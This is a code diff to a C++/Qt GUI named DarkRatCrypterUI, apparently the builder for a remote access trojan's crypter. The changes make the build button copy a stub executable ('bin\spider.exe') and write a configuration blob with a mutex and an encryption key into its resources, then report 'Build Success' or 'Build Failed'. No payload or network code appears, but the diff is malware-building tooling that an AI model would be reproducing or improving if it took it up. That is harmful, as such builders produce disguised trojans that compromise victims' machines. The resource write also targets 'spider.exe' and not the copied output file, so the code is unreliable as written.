@@ -83,18 +83,29 @@ void DarkRatCrypterUI::on_gen_mutex_clicked()
 	ui.mutex->setText(QString::fromStdString(random_string(5)));
 }
 
+void DarkRatCrypterUI::on_btn_change_output_clicked()
+{
+	QMessageBox msgBox1;
+	msgBox1.setText("TODO");
+	msgBox1.exec();
+}
+
 void DarkRatCrypterUI::on_gen_enckey_clicked()
 {
 	ui.encryptionkey->setText(QString::fromStdString(random_string(32)));
 }
 
 
-void WriteToResources(LPCSTR szTargetPE, int id, LPBYTE lpBytes, DWORD dwSize)
+bool WriteToResources(LPCSTR szTargetPE, int id, LPBYTE lpBytes, DWORD dwSize)
 {
 	HANDLE hResource = NULL;
 	hResource = BeginUpdateResourceA(szTargetPE, FALSE);
-	UpdateResource(hResource, RT_RCDATA, MAKEINTRESOURCE(id), MAKELANGID(LANG_NEUTRAL, SUBLANG_DEFAULT), (LPVOID)lpBytes, dwSize);
+	bool update = UpdateResource(hResource, RT_RCDATA, MAKEINTRESOURCE(id), MAKELANGID(LANG_NEUTRAL, SUBLANG_DEFAULT), (LPVOID)lpBytes, dwSize);
+	if (!update) {
+		return false;
+	}
 	EndUpdateResource(hResource, FALSE);
+	return true;
 }
 
 QString base64_encode(QString string) {
@@ -142,7 +153,25 @@ void DarkRatCrypterUI::on_build_clicked()
 	char* c_write = &write[0u];
 
 
-	WriteToResources("test.exe", 10, (BYTE*)c_write, strlen(c_write));
+
+	//output_file
+	std::string szFilePath ="bin\\spider.exe";
+	std::string szCopyPath = ui.outputname->text().toStdString();
+	//std::string szCopyPath = "";
+	QFile::copy(QString::fromStdString(szFilePath), QString::fromStdString(szCopyPath));
+	//CopyFile((LPCWSTR)szFilePath.c_str(), (LPCWSTR)szCopyPath.c_str(), FALSE);
+	bool buildSuccess = WriteToResources("spider.exe", 10, (BYTE*)c_write, strlen(c_write));
+
+	if (buildSuccess) {
+		QMessageBox msgBox1;
+		msgBox1.setText(QString::fromStdString("Build Success"));
+		msgBox1.exec();
+	}else {
+		QMessageBox msgBox2;
+		msgBox2.setText(QString::fromStdString("Build Failed"));
+		msgBox2.exec();
+	}
+
 	//MessageBox(NULL, TEXT("Open the message box1 "), , MB_OK | MB_SYSTEMMODAL);
 
 
